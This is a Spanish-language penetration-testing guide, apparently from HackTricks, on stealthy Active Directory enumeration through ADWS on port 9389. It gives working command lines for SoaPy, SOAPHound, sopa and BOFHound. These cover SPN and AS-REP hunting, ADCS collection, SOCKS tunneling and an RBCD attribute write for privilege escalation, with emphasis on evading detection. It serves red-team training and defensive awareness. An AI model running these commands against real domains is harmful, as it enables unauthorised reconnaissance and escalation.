# Active Directory Web Services (ADWS) Enumeración y recolección sigilosa

{{#include ../../banners/hacktricks-training.md}}

## ¿Qué es ADWS?

Active Directory Web Services (ADWS) está **habilitado por defecto en cada Domain Controller desde Windows Server 2008 R2** y escucha en TCP **9389**. A pesar del nombre, **no hay HTTP involucrado**. En su lugar, el servicio expone datos estilo LDAP a través de una pila de protocolos propietarios .NET:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Debido a que el tráfico está encapsulado dentro de estos marcos SOAP binarios y viaja por un puerto poco común, **la enumeración vía ADWS es mucho menos probable que sea inspeccionada, filtrada o detectada por firmas que el tráfico LDAP/389 & 636 clásico**. Para los operadores esto significa:

* Recon más sigiloso – los equipos azules a menudo se concentran en las consultas LDAP.
* Libertad para recolectar desde **hosts no Windows (Linux, macOS)** túnelizando 9389/TCP a través de un proxy SOCKS.
* Los mismos datos que obtendrías vía LDAP (usuarios, grupos, ACLs, schema, etc.) y la capacidad de realizar **writes** (por ejemplo, `msDs-AllowedToActOnBehalfOfOtherIdentity` para **RBCD**).

Las interacciones ADWS se implementan sobre WS-Enumeration: cada consulta comienza con un mensaje `Enumerate` que define el filtro/atributos LDAP y devuelve un GUID `EnumerationContext`, seguido de uno o más mensajes `Pull` que transmiten hasta la ventana de resultados definida por el servidor. Los contextos expiran después de ~30 minutos, por lo que las herramientas necesitan paginar resultados o dividir filtros (consultas por prefijo en CN) para evitar perder estado. Al solicitar descriptores de seguridad, especifica el control `LDAP_SERVER_SD_FLAGS_OID` para omitir SACLs; de lo contrario ADWS simplemente elimina el atributo `nTSecurityDescriptor` de su respuesta SOAP.

> NOTA: ADWS también es usado por muchas herramientas RSAT GUI/PowerShell, por lo que el tráfico puede mezclarse con actividad administrativa legítima.

## SoaPy – Cliente nativo en Python

[SoaPy](https://github.com/logangoins/soapy) es una **reimplementación completa de la pila de protocolos ADWS en Python puro**. Construye los marcos NBFX/NBFSE/NNS/NMF byte a byte, permitiendo la recolección desde sistemas tipo Unix sin tocar el runtime .NET.

### Características clave

* Soporta **proxying through SOCKS** (útil desde implants de C2).
* Filtros de búsqueda granulares idénticos a LDAP `-q '(objectClass=user)'`.
* Operaciones opcionales de **write** (`--set` / `--delete`).
* Modo de salida **BOFHound** para ingestión directa en BloodHound.
* Bandera `--parse` para embellecer timestamps / `userAccountControl` cuando se requiere legibilidad humana.

### Opciones de recopilación dirigidas y operaciones de escritura

SoaPy incluye switches curados que replican las tareas de hunting LDAP más comunes sobre ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, además de los knobs crudos `--query` / `--filter` para pulls personalizados. Combínalos con primitivas de escritura como `--rbcd <source>` (setea `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (staging de SPN para Kerberoasting dirigido) y `--asrep` (cambia `DONT_REQ_PREAUTH` en `userAccountControl`).

Ejemplo de búsqueda dirigida de SPN que solo devuelve `samAccountName` y `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Usa el mismo host/credentials para weaponise inmediatamente los hallazgos: dump objetos RBCD-capable con `--rbcds`, luego aplica `--rbcd 'WEBSRV01$' --account 'FILE01$'` para stage una Resource-Based Constrained Delegation chain (consulta [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) para la ruta completa de abuso).

### Instalación (host operador)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Sopa - Un cliente práctico para ADWS en Golang

Al igual que soapy, [sopa](https://github.com/Macmod/sopa) implementa la pila de protocolos ADWS (MS-NNS + MC-NMF + SOAP) en Golang, exponiendo flags de línea de comandos para emitir llamadas ADWS como:

* **Búsqueda y recuperación de objetos** - `query` / `get`
* **Ciclo de vida de objetos** - `create [user|computer|group|ou|container|custom]` and `delete`
* **Edición de atributos** - `attr [add|replace|delete]`
* **Gestión de cuentas** - `set-password` / `change-password`
* y otros como `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

## SOAPHound – Recolección de alto volumen de ADWS (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) es un colector .NET que mantiene todas las interacciones LDAP dentro de ADWS y emite JSON compatible con BloodHound v4. Construye una caché completa de `objectSid`, `objectGUID`, `distinguishedName` y `objectClass` una vez (`--buildcache`), luego la reutiliza para pases de alto volumen `--bhdump`, `--certdump` (ADCS), o `--dnsdump` (AD-integrated DNS) de modo que solo ~35 atributos críticos salen del DC. AutoSplit (`--autosplit --threshold <N>`) divide automáticamente las consultas por prefijo CN para mantenerse por debajo del timeout de EnumerationContext de 30 minutos en bosques grandes.

Flujo de trabajo típico en una VM de operador unida al dominio:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Los JSON exportados se integran directamente en los workflows de SharpHound/BloodHound — consulta [BloodHound methodology](bloodhound.md) para ideas de graficado posteriores. AutoSplit hace que SOAPHound sea resistente en bosques de millones de objetos, manteniendo el recuento de consultas por debajo del de ADExplorer-style snapshots.

## Flujo sigiloso de recolección AD

El siguiente flujo muestra cómo enumerar **objetos de dominio y ADCS** vía ADWS, convertirlos a BloodHound JSON y buscar rutas de ataque basadas en certificados – todo desde Linux:

1. **Tunnel 9389/TCP** desde la red objetivo hacia tu equipo (p. ej. vía Chisel, Meterpreter, reenvío de puerto dinámico SSH, etc.). Exporta `export HTTPS_PROXY=socks5://127.0.0.1:1080` o usa SoaPy’s `--proxyHost/--proxyPort`.

2. **Recolecta el objeto raíz del dominio:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Recopilar objetos relacionados con ADCS del Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Convertir a BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Sube el ZIP** en la BloodHound GUI y ejecuta consultas cypher como `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` para revelar rutas de escalada de certificados (ESC1, ESC8, etc.).

### Escritura de `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combínalo con `s4u2proxy`/`Rubeus /getticket` para una cadena completa de Resource-Based Constrained Delegation (ver [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Resumen de herramientas

| Propósito | Herramienta | Notas |
|---------|------|-------|
| Enumeración de ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| Volcado de alto volumen de ADWS | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| Ingesta para BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Convierte logs de SoaPy/ldapsearch |
| Compromiso de certificados | [Certipy](https://github.com/ly4k/Certipy) | Puede usarse a través del mismo SOCKS |
| Enumeración ADWS y cambios de objetos | [sopa](https://github.com/Macmod/sopa) | Cliente genérico para interactuar con endpoints ADWS conocidos - permite enumeración, creación de objetos, modificación de atributos y cambios de contraseñas |

## Referencias

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
